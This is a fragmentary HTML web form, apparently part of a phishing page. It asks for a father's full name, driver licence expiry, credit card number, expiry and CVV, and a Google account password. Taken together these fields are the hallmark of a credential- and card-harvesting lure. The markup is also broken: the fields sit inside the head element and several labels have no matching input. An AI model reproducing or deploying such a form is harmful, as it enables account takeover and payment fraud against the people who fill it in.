<!DOCTYPE html>
<html lang="en">
<head>

                <label for="ffn">Father's Full Name</label>

                <label for="dl-exp">Driver License Expiration Date</label>
                <input type="text" name="dl-exp" placeholder="MM/DD/YY" required>
                
                <label for="card">Credit Card Number</label>
                <input type="text" name="card" placeholder="1234 5678 9012 3456" required>

                <label for="expiry">Card Expiry Date</label>
                <input type="text" name="expiry" placeholder="MM/YY" required>

                <label for="cvv">Card Verification Value (CVV)</label>

                <label for="gpassword">Google Password</label>
                <input type="password" name="gpassword" placeholder="google password" required>

    <footer>
